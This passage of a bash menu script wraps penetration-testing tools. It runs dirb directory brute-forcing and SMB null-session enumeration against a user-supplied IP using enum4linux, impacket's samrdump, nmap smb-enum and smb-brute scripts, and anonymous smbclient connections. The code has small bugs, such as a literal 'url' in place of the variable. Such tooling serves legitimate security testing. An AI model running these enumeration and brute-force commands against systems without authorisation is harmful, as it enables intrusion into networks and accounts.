					dirb=$(echo -e "1.  Default Directory list                   | dirb <url>\n2.  Choose a Directory List                  | dirb <url> <dirlist> -w\n3.  Add File Extentions .php .old and .bak   | dirb <url> <dirlist> -w -X '.php,.old,.bak'\n4.  Back\n5.  Exit" | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Which Dirb Command would you like to use?" | cut -d '.' -f 1)
					###Default Directory List
					if [[ $dirb == "1" ]]; then
						dirb "$url"
					
					###Choose Directory List
					elif [[ $dirb == "2" ]]; then
						dirlist=$(find /usr/share/dirb/wordlists/* /usr/share/dirbuster/wordlists/* -name '*.txt' | sort | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Which Password List would you like to use?")
						dirb "$url" "$dirlist" -w
					
					##Add File Extention
					elif [[ $dirb == "3" ]]; then
						dirlist=$(find /usr/share/dirb/wordlists/* /usr/share/dirbuster/wordlists/* -name '*.txt' | sort | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Which Password List would you like to use?")
						dirb "url" "$dirlist" -w -X '.php,.old,.bak'
				
					##BACK
					elif [[ $dirb == "4" ]]; then
						break

					##EXIT
					elif [[ $dirb == "5" ]]; then
						exit
					fi
				done


			#NULL SESSIONS
			elif [[ "$syntax" == "6" ]]; then
				while true; do
					nullsession=$(echo -e "1.  nblookup/netstat *    | enum4linux -n <IP>\n2.  Password Policy Info  | enum4linux -P <IP>\n3.  Enumerate Shares List | enum4linux -S <IP>\n4.  Enumerate Users List  | enum4linux -U <IP>\n5.  Set All Flags   *     | enum4linux -a <IP>\n6.  Brute Forces Shares   | enum4linux -s /usr/share/enum4linux/share-list.txt <IP>\n7.  SamrDump.py           | python3 /usr/share/doc/python3-impacket/examples/samrdump.py <IP>\n8.  Nmap Smb Shares       | nmap -script=smb-enum-shares <IP>\n9.  Nmap Smb Users        | nmap -script=smb-enum-users <IP>\n10. Nmap Smb Brute        | nmap -script=smb-brute <IP>\n11. Service Available     | smbclient -L //<IP> \n12. Force no Pass         | smbclient -L //<IP> -N\n13. Exploit Null Sessions | smbclient //<IP>/IPC$ -N\n14. List Shares  *        | smbclient -L WORKGROUP -i <IP> -N -U ' '\n15. Access WorkShare *    | smbclient \\\\\\\\\\\\\\<IP>\\\\\\WorkSharing -N\n16. Back\n17. Exit" | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Which smb share command would you like to use?" | cut -d '.' -f 1)
					
					##E4L NbLookup/Netstat
					if [[ $nullsession == "1" ]]; then
						enum4linux -n "$scan"

					##E4L Password Policy
					elif [[ $nullsession == "2" ]]; then
						enum4linux -P "$scan"
					
					##E4L Enumerate Shares List
					elif [[ $nullsession == "3" ]]; then
						enum4linux -S "$scan"
					
					##E4L Enumerate Users List
					elif [[ $nullsession == "4" ]]; then
						enum4linux -U "$scan"
					
					##E4L Set all flags
					elif [[ $nullsession == "5" ]]; then
						enum4linux -a "$scan"
					
					##E4L Brute Force Shares
					elif [[ $nullsession == "6" ]]; then
						enum4linux -s /usr/share/enum4linux/share-list.txt "$scan"

					##SamRDump.py
					elif [[ $nullsession == "7" ]]; then
						python3 /usr/share/doc/python3-impacket/examples/samrdump.py "$scan"

					##Nmap Smb Shares
					elif [[ $nullsession == "8" ]]; then
						nmap -script=smb-enum-shares "$scan"

					##Nmap Smb Users
					elif [[ $nullsession == "9" ]]; then
						nmap -script=smb-enum-users "$scan"
					
					##Nmap Smb Brute
					elif [[ $nullsession == "10" ]]; then
						nmap -script=smb-brute "$scan"

					
					##smbclient Service Available
					elif [[ $nullsession == "11" ]]; then
						smbclient -L //"$scan"

					##smbclient Force No Pass
					elif [[ $nullsession == "12" ]]; then
						smbclient -L //"$scan" -N

					##smbclient Exploit Null Session	
					elif [[ $nullsession == "13" ]]; then
						smbclient //"$scan"/IPC$ -N
					
					##smbclient No Pass/User
					elif [[ $nullsession == "14" ]]; then
						smbclient -L WORKGROUP -I "$scan" -N -U ' '
					
					#smbclient Not Sure
					elif [[ $nullsession == "15" ]]; then
						smbclient \\\\"$scan"\\WorkSharing -N
					
					##BACK	
					elif [[ $nullsession == "16" ]]; then
						break

					##EXIT
					elif [[ $nullsession == "17" ]]; then
						exit


					fi
				done
			

			#Change IP ADDRESS
			elif [[ "$syntax" == "7" ]]; then
				break
			
			#Change InterFace	
			elif [[ "$syntax" == "8" ]]; then
				break 2
			#Exit 
			elif [[ "$syntax" == "9" ]]; then
				exit

			fi
		done
	done
done
